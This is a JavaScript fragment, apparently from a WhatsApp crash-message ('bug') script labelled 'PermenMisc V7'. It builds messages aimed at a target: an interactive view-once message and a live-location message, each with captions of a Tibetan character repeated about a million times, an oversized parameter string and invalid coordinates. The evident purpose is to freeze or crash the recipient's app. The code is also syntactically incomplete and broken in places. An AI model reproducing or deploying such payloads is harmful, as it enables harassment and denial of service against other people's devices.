...
async function skids(target, apalah) {
    var etc = generateWAMessageFromContent(target, proto.Message.fromObject({ viewOnceMessage: {message: {"interactiveMessage": {"header": {"title": "","subtitle": ""},"body": {"text": `PermenMisc V7 💀` + "ྦྷ".repeat(999999)},"footer": {"text": "KokNdakNgefekJirApalah"},"nativeFlowMessage": {"buttons": [{"name": "cta_url","buttonParamsJson": "{ display_text : 'Skidayo', url : , merchant_url : }"}],"messageParamsJson": "".repeat(9999999)}}}}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `PermenMisc V7 💀` + "ྦྷ".repeat(999999),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
